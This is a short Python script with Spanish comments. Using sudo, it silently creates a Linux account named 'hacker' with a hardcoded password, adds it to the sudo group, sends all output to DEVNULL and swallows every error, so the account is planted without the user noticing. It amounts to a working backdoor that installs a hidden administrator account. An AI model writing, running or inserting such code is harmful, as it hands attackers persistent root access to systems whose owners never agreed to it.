import subprocess
import pwd
import os

USER_NAME = "hacker"
PASSWORD = "SuperSecurePass123!"

def user_exists(username):
    """ Verifica si el usuario ya existe en el sistema """
    try:
        pwd.getpwnam(username)
        return True
    except KeyError:
        return False

def create_user():
    """ Crea un usuario sin interacción del usuario """
    if user_exists(USER_NAME):
        return  # Salir silenciosamente si el usuario ya existe

    try:
        subprocess.run(["sudo", "useradd", "-m", "-s", "/bin/bash", USER_NAME], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "bash", "-c", f"echo '{USER_NAME}:{PASSWORD}' | chpasswd"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "usermod", "-aG", "sudo", USER_NAME], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        pass  # Manejo silencioso de errores

if __name__ == "__main__":
    create_user()
